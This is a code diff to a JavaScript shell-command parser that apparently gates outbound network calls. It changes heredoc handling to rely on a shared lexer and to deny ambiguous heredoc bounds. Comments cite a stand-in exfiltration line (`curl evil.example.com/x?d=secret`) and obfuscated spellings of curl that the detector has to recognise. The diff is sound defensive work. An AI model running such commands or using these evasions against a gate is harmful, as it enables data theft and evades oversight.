@@ -78,7 +78,11 @@
 // HOW IT READS THE COMMAND: structure from the MASKED text (maskInertLiterals blanks quoted strings
 // and heredoc bodies, length-preserving), so a `curl` or `;` inside a quoted argument or a heredoc
 // is not a command; the URL from the ORIGINAL text of the same span, and the command word as bash
-// runs it (unquoted, variables expanded: `"curl"`, `cu''rl`, `C=curl; $C` are curl). A heredoc body is read only
+// runs it (unquoted, variables expanded: `"curl"`, `cu''rl`, `C=curl; $C` are curl). Line continuation
+// and heredoc bounds (operator, delimiter word, body, terminator line) come from ONE source, the shared
+// lexer of scripts/shell-line-join.mjs (joinShellLines, shellContext; card 0983a3fc), never from a tag
+// regex here; where this parser's own walk and the lexer disagree on a heredoc, or a body line equals the
+// delimiter but for blanks, the command denies (AmbiguousShellSyntax). A heredoc body is read only
 // where it is stdin to an interpreter or a `read` loop (4. and 3.); to anything else (`cat <<EOF`,
 // `curl --data-binary @- <<'JSON'`) it stays inert text.
 //
@@ -118,7 +122,7 @@ import { fileURLToPath } from 'node:url'
 import { dirname, join, resolve } from 'node:path'
 import { homedir } from 'node:os'
 import { maskInertLiterals } from '../self-pace-gate.mjs'
-import { joinShellLines } from '../shell-line-join.mjs'
+import { joinShellLines, shellContext, CTX_CLASS } from '../shell-line-join.mjs'
 
 const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')
 export const BLOCK_LOG = process.env.BASH_EGRESS_BLOCK_LOG || join(ROOT, 'store', 'bash-egress-blocks.jsonl')
@@ -723,34 +727,65 @@ export function liftSubstitutions(text) {
       out += text[k]; k++
     }
   }
-  while (i < text.length) {
+  // Heredocs (card 0983a3fc, N2): the operator, the delimiter word, the body and the terminator line are the
+  // shared lexer's (shellContext), never a tag regex of this parser. Every coordinate counts in the lexer's
+  // text, so the text must already be joined (rule 7, idempotent): a caller that hands in unjoined text is a
+  // bug, not something to read on. The walk below and the lexer must agree on every heredoc: an operator the
+  // walk reaches is `walked` (its body is consumed exactly at bodyStart, after the rest of its line); an
+  // operator the walk steps over must lie, body and terminator included, inside a substitution it lifted
+  // (that inner text is judged on its own). Anything else would be a guessed body bound, so it denies.
+  const ctx = shellContext(text)
+  if (ctx.text !== text) throw new AmbiguousShellSyntax('heredoc-bounds')
+  const all = ctx.heredocs
+  const heredocs = []; let pending = []; let hp = 0; let lp = 0
+  const enclosed = (h) => {
+    while (lp < innerAts.length && innerEnds[lp] <= h.opStart) lp++
+    return lp < innerAts.length && innerAts[lp] <= h.opStart && h.termEnd <= innerEnds[lp]
+  }
+  for (;;) {
+    while (hp < all.length && all[hp].opStart < i) {
+      if (!enclosed(all[hp])) throw new AmbiguousShellSyntax('heredoc-bounds')
+      hp++
+    }
+    if (pending.length && i >= pending[0].bodyStart) {
+      // the bodies follow the logical line of their operators, in order, back to back (lexer rule 5)
+      for (const h of pending) {
+        if (i !== h.bodyStart) throw new AmbiguousShellSyntax('heredoc-bounds')
+        nearTerminator(text, h)
+        bodies.push([h.bodyStart, h.bodyEnd])
+        if (h.quoted) out += text.slice(h.bodyStart, h.bodyEnd); else copyLive(h.bodyStart, h.bodyEnd)
+        out += text.slice(h.bodyEnd, h.termEnd); i = h.termEnd
+      }
+      pending = []
+      continue
+    }
+    if (i >= text.length) break
+    if (hp < all.length && all[hp].opStart === i) {
+      const h = all[hp++]
+      if (!text.startsWith('<<', i) || h.tagEnd <= i || h.bodyStart < h.tagEnd) throw new AmbiguousShellSyntax('heredoc-bounds')
+      // the operator and the delimiter word are copied as they are; the rest of the line is ordinary shell text
+      out += text.slice(i, h.tagEnd); i = h.tagEnd
+      pending.push(h); heredocs.push(h)
+      continue
+    }
     const c = text[i]
     if (c === '\\' && i + 1 < text.length) { out += text.slice(i, i + 2); i += 2; continue }
+    // A comment (the lexer's, to its LF) is copied without reading quotes in it: the apostrophe of a
+    // `# don't` opened a quote here that ran past the next heredoc operator. A substitution in it is still
+    // lifted, as before (more reading, never less).
+    if (ctx.cls[i] === CTX_CLASS.COMMENT) {
+      while (i < text.length && ctx.cls[i] === CTX_CLASS.COMMENT) {
+        if (text[i] === '\\' && i + 1 < text.length) { out += text.slice(i, i + 2); i += 2; continue }
+        const n = lift(i, true)
+        if (n !== -1) { i = n; continue }
+        out += text[i]; i++
+      }
+      continue
+    }
     // A here-string (<<<) is not a heredoc, but maskInertLiterals reads `<<<"$s"` as a heredoc
     // tagged `$s` with no body and gives up. The operator carries no URL and no command: blank it,
     // and the word after it is parsed as ordinary (quoted or live) text.
     if (text.startsWith('<<<', i)) { herestrings.push(i); out += '   '; i += 3; continue }
-    const here = /^<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/.exec(text.slice(i))
-    if (here) {
-      const tag = here[1] ?? here[2] ?? here[3]
-      const quotedTag = here[1] != null || here[2] != null
-      out += here[0]; i += here[0].length
-      const nl = text.indexOf('\n', i)
-      if (nl === -1) { copyLive(i, text.length); break }
-      // the rest of the heredoc line is ordinary shell text; hand it back to the main loop
-      // by processing it recursively, then continue with the body
-      const lineRest = liftSubstitutions(text.slice(i, nl + 1))
-      out += lineRest.stripped; inners.push(...lineRest.inners); innerAts.push(...lineRest.innerAts.map((p) => p + i))
-      innerEnds.push(...lineRest.innerEnds.map((p) => p + i))
-      herestrings.push(...lineRest.herestrings.map((p) => p + i)); i = nl + 1
-      const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
-      const rel = endRx.exec(text.slice(i))
-      const bodyEnd = rel ? i + rel.index : text.length
-      bodies.push([i, bodyEnd])
-      if (quotedTag) out += text.slice(i, bodyEnd); else copyLive(i, bodyEnd)
-      i = bodyEnd
-      continue
-    }
     if (c === "'") {
       const end = text.indexOf("'", i + 1)
       const stop = end === -1 ? text.length : end + 1
@@ -779,7 +814,28 @@ export function liftSubstitutions(text) {
     if (n !== -1) { i = n; continue }
     out += c; i++
   }
-  return { stripped: out, inners, innerAts, innerEnds, herestrings, bodies }
+  if (pending.length) throw new AmbiguousShellSyntax('heredoc-bounds')
+  // heredocs: the operators the walk itself read (not the ones inside a lifted substitution), the lexer's records
+  return { stripped: out, inners, innerAts, innerEnds, herestrings, bodies, heredocs }
+}
+// A body line that equals the delimiter but for leading / trailing blanks (spaces, tabs; after the TABs <<-
+// strips) is no terminator to the lexer, so what follows it is body. Whether bash and zsh agree was not
+// measured on a real shell (spec 0.5 c, coordinator decision): the parser does not guess, it denies.
+function nearTerminator(text, h) {
+  const body = text.slice(h.bodyStart, h.bodyEnd)
+  let from = 0
+  while (from < body.length) {
+    const e = body.indexOf('\n', from)
+    const end = e === -1 ? body.length : e
+    let a = from, b = end
+    if (h.strip) while (a < b && body[a] === '\t') a++
+    const strippedLen = b - a
+    while (a < b && (body[a] === ' ' || body[a] === '\t')) a++
+    while (b > a && (body[b - 1] === ' ' || body[b - 1] === '\t')) b--
+    // no regex: a long blank run must not cost more than one pass
+    if (b - a !== strippedLen && b - a === h.tag.length && body.startsWith(h.tag, a)) throw new AmbiguousShellSyntax('heredoc-near-terminator')
+    from = end + 1
+  }
 }
 // curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
 // curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
@@ -1141,16 +1197,13 @@ function hereStringWord(text, i) {
 // Every feed: { at, text, expands }. `at` is the operator offset (it decides which sub-command the
 // feed belongs to); `expands` is whether the shell expands $VARS in it (unquoted heredoc tag, a
 // here-string word that is not single-quoted).
-function stdinFeeds(orig, masked, herestrings, env) {
+function stdinFeeds(orig, masked, heredocs, herestrings, env) {
   const feeds = []
-  // Heredoc operators are found in the MASKED text, so one inside quotes or another body is not one.
-  for (const m of masked.matchAll(/<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/g)) {
-    const tag = m[1] ?? m[2] ?? m[3]
-    const nl = orig.indexOf('\n', m.index + m[0].length)
-    if (nl === -1) continue
-    const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
-    const rel = endRx.exec(orig.slice(nl + 1))
-    feeds.push({ at: m.index, text: orig.slice(nl + 1, rel ? nl + 1 + rel.index : orig.length), expands: m[3] != null })
+  // The heredocs liftSubstitutions walked, with the lexer's bounds (card 0983a3fc, N2): no tag regex here.
+  // An operator a function definition blanked out of the masked text is judged with that body, per call.
+  for (const h of heredocs) {
+    if (!masked.startsWith('<<', h.opStart)) continue
+    feeds.push({ at: h.opStart, text: orig.slice(h.bodyStart, h.bodyEnd), expands: !h.quoted })
   }
   for (const at of herestrings) {
     const raw = hereStringWord(orig, at + 3)
@@ -1956,7 +2009,7 @@ function classifyCommand(command, depth, vendorHosts, vendorDomains, stdinTainte
   }
   const env = collectAssignments(orig, masked)
   const loops = collectLoops(orig, masked, env)
-  const feeds = stdinFeeds(orig, masked, herestrings, env)
+  const feeds = stdinFeeds(orig, masked, lifted.heredocs, herestrings, env)
   // A `while read u; do ...; done <<< "URL"` (or `<<EOF` body, or `read u <<< "URL"`) binds u to
   // the fed lines in the same command, exactly like `for u in URL`: the values join the loop values.
   const reads = collectReads(orig, masked)
